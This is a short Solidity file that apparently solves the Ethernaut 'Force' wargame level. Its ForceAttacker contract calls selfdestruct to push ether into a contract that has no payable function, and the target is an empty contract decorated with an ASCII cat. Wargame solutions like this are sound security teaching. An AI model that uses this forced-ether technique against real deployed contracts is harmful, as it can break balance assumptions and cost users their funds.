// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttacker {
  Force public vulnerableContract = Force(0x4eB9AE8854D4a4D6aCfC2D5E88c178270bAb400F); // ethernaut vulnerable contract

  function attack() external payable {
    address payable addr = payable(address(vulnerableContract));
    selfdestruct(addr);
  }
}

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
